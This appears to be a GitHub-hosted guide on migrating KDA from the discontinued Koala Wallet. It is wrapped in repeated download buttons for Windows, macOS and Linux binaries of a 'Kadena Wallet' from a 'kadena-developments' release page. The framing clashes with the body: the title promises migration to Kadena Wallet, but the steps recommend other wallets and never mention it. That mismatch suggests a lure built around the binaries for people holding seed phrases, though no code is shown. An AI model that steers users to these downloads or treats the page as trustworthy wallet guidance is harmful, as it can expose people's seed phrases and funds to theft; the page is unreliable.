![Kadena Wallet](assets/banner-article.png)

<h1 align="center">Migrating from Koala to Kadena Wallet After KDA Removal</h1>

<p align="center">A Kadena Wallet guide to keys, backups and devices.</p>

<p align="center"><a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-94D3BF?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Windows" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-94D3BF?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="Download for macOS" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-94D3BF?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

> Only download from this GitHub release page.

On 25 November 2025, Koala Wallet announced it was discontinuing Kadena support across all of its products and delisting KDA from the app. If your KDA lived in Koala, nothing was lost, but the app you used to reach it stopped being a reliable place to keep it.

This covers what Koala actually said, what its seed format means for you, and how to move the balance somewhere you control without breaking the derivation.

## You'll see this if

- Koala no longer shows KDA, or shows it with no value.
- You have a 24-word phrase from Koala and no obvious place to put it.
- You are unsure whether Koala's phrase is compatible with other Kadena wallets.
- You have KDA in Koala and are worried the app's wind-down will strand it.

## What happened

Koala's announcement was specific: KDA discontinued "across all Koala Wallet products and services", including removal from the app. The company's site now redirects to a notice about migrating to Coinomi.

That is a product decision, not a chain event. KDA on a public chain does not disappear because an app stops supporting it. What changes is the tooling: if you cannot sign with Koala, you need a wallet that can, and you need your phrase to work there.

## Koala's phrase, and why it matters

Koala used a 24-word BIP39 phrase and derived its first Kadena account at `m/44'/626'/0'`. Twenty-four words is the more common format for hardware-oriented wallets and carries 256 bits of entropy.

The number alone does not guarantee compatibility. Wallets differ in how they walk from the master key to the leaf addresses, and a wallet that reads the same words along a different path will show a different account with a zero balance. So the rule from every migration is the same: **compare the derived address before moving anything.**

Koala documented an export route using its own open-source KadenaKeys tool, which reads the phrase and produces the associated Kadena keys and addresses. If you still have the app installed, that tool is the surest way to learn exactly which addresses your phrase controls.

## The migration sequence

1. **Write down your Koala addresses and balances before you install anything new.** Open the app if it still runs, note each account and which chain holds value.
2. **Write the 24-word phrase down by hand.** Do not photograph it. If you already have it stored, verify it matches word for word.
3. **Choose a destination wallet that documents Kadena support.** As of November 2026 the community wallet list names Linx, eckoWALLET, Zelcore, and Chainweaver. Several of those explicitly document importing Koala accounts.
4. **Import, then compare addresses.** If the first address does not match the one you wrote down, the derivation is off. Try the wallet's Koala or 24-word option, or a different wallet.
5. **Verify balances across chains.** A Koala account that held KDA on one chain will show nothing on another. Check each before concluding the import failed.
6. **Send a small test transaction** to a fresh address you control, and confirm it lands, before moving the full balance.
7. **Retire the Koala install** once the balance is moved and verified, but keep the phrase.

## If the import shows an empty account

Check these in order, because each has a different fix:

| Symptom | Likely cause | Fix |
| --- | --- | --- |
| Address differs from Koala's | Wrong derivation path | Use a wallet that offers Koala-compatible import; compare again |
| Address matches, balance zero | Wrong chain selected | Switch chains 0 to 19, recheck |
| Address matches, explorer shows a balance | Wallet indexer issue | Re-add the account, or check in an explorer |
| Phrase rejected outright | Word order, spelling, or language | Recount words; BIP39 has a checksum, so one wrong word invalidates the phrase |

That last row deserves emphasis: BIP39 phrases fail loudly when a word is wrong, which is a feature. If a wallet accepts a phrase and shows an empty account, the phrase is probably right and the derivation is probably wrong.

## About the Coinomi redirect

Koala's site points at Coinomi, and Coinomi's help centre documents an import flow. Whether Coinomi currently supports KDA specifically could not be verified, and Koala's own announcement was about discontinuing KDA rather than handing it to a successor.

Treat a redirect as a suggestion, not a guarantee. Verify KDA support in the destination product before you depend on it, and keep your phrase in a form that any compatible wallet can read.

## What you should not do

- **Do not send KDA to an address you have not verified.** A matching first eight characters is not a match.
- **Do not use a "recovery service" that asks for the phrase.** No legitimate service needs it, and Koala's shutdown has created exactly the conditions scammers exploit.
- **Do not consolidate on an exchange** unless you specifically want to sell. With the current listing picture, moving KDA to a venue can be harder to reverse than moving it to a wallet.
- **Do not delete the app until the balance is confirmed elsewhere.** Some users need the app's own export tool to recover addresses.

## Timing and risk

Koala's app remains installable on the stores, which means the migration is not urgent in the way an exchange deadline is. It is still worth doing while the app runs, because the tools that read a Koala phrase are third-party and can change.

There is also a subtler risk: if a phrase is imported into several places while you are testing, each place becomes a copy of your keys. Import once into a wallet you intend to keep, verify, and stop.

## FAQ

**Is my KDA gone because Koala dropped it?**
No. KDA lives on-chain. Koala was an interface, and interfaces come and go.

**Can I use my 24 words in a 12-word wallet?**
No. Word count is part of the format. A wallet that expects twelve will not read twenty-four.

**Do I need KadenaKeys?**
Only if you want to know exactly which addresses your phrase controls. It is useful for verification, not required for migration.

**Will Koala's removal affect my transaction history?**
Only your ability to view it in that app. On-chain history stays on-chain and is visible in any explorer for the address.

**What if I already deleted the app?**
The phrase is what matters. Import it into a compatible wallet; the app itself is not the source of your funds.

## Related reading

- Importing a Chainweaver seed into Kadena Wallet
- How to create a KDA account in Kadena Wallet
- Ledger not showing a KDA balance
- Is Kadena dead? What ended and what still runs

---

## Download Kadena Wallet

Kadena Wallet is a self-custody desktop wallet for KDA on Chainweb, published for Windows, macOS and Linux.

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions, file sizes and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

## Related guides

- [Moving from Linx to Kadena Wallet: Seeds and Accounts](https://github.com/kadena-developments/keys-and-devices-handbook/blob/main/linx-to-kadena-wallet-migration.md)
- [Ledger and KDA: Setup, Paths and the Ledger Live Gap](https://github.com/kadena-developments/keys-and-devices-handbook/blob/main/ledger-kda-setup-kadena-wallet.md)
- [Ledger Not Showing KDA? What Kadena Wallet Users Check First](https://github.com/kadena-developments/keys-and-devices-handbook/blob/main/ledger-not-showing-kadena-balance.md)

---

Part of the [Kadena Wallet guides](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/README.md). Main application: [kadena-desktop-wallet](https://github.com/kadena-developments/kadena-desktop-wallet). Licence: BSD-3-Clause.
